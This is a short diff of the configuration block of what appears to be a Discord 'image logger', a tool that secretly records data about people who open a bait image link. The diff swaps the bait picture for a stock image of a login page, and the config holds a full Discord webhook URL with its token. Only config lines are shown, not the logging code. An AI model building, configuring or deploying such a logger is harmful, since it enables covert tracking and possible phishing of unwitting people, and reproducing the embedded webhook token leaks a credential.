@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1401030435500327123/Y-fH4HrinvHlJn4QOoTpkl446A-XspptlmOskYUXpzSR1txYfesXVhuxF9X--uGQfAMv",
-    "image": "https://t4.ftcdn.net/jpg/02/66/72/41/360_F_266724172_Iy8gdKgMa7XmrhYYxLCxyhx6J7070Pr8.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://static.vecteezy.com/ti/vetor-gratis/p1/11277904-tela-de-login-modelo-de-ilustracaoial-de-design-de-pagina-de-login-moderno-gratis-vetor.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
